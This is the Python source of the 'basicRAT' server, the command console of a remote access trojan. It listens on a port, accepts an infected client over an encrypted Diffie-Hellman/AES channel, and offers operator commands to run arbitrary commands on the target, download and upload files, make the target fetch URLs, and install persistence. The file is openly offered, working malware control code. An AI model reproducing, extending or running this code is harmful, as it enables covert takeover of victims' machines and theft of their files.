#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT server
# https://github.com/vesche/basicRAT
#

import argparse
import readline
import socket
import struct
import sys
import time

from core import common
from core import crypto
from core import filesock


# ascii banner (Crawford2) - http://patorjk.com/software/taag/
# ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
BANNER = '''
 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT
'''
HELP_TEXT = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.'''
COMMANDS = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
             'unzip', 'upload', 'wget' ]


def get_parser():
    parser = argparse.ArgumentParser(description='basicRAT server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return parser


def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    port    = args['port']

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind(('0.0.0.0', port))
    except socket.error:
        print 'Error: Unable to start server, port {} in use?'.format(port)
        sys.exit(1)

    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print line

    print 'basicRAT server listening on port {}...'.format(port)

    s.listen(10)
    conn, addr = s.accept()

    DHKEY = crypto.diffiehellman(conn, server=True)

    while True:
        prompt = raw_input('\n[{}] basicRAT> '.format(addr[0])).rstrip()

        # allow noop
        if not prompt:
            continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        # ensure command is valid before sending
        if cmd not in COMMANDS:
            print 'Invalid command, type "help" to see a list of commands.'
            continue

        # display help text
        if cmd == 'help':
            print HELP_TEXT
            continue

        # send data to client
        conn.send(crypto.AES_encrypt(prompt, DHKEY))

        # stop server
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # results of command
        elif cmd == 'run':
            recv_data = conn.recv(4096)
            print crypto.AES_decrypt(recv_data, DHKEY).rstrip()

        # download a file
        elif cmd == 'download':
            for fname in action.split():
                fname = fname.strip()
                filesock.recvfile(conn, fname, DHKEY)

        # send file
        elif cmd == 'upload':
            for fname in action.split():
                fname = fname.strip()
                filesock.sendfile(conn, fname, DHKEY)

        # regenerate DH key
        elif cmd == 'rekey':
            DHKEY = crypto.diffiehellman(conn, server=True)

        # results of persistence, unzip, or wget
        elif cmd == 'persistence' or 'unzip' or 'wget':
            print 'Running {}...'.format(cmd)
            recv_data = conn.recv(1024)
            print crypto.AES_decrypt(recv_data, DHKEY)


if __name__ == '__main__':
    main()
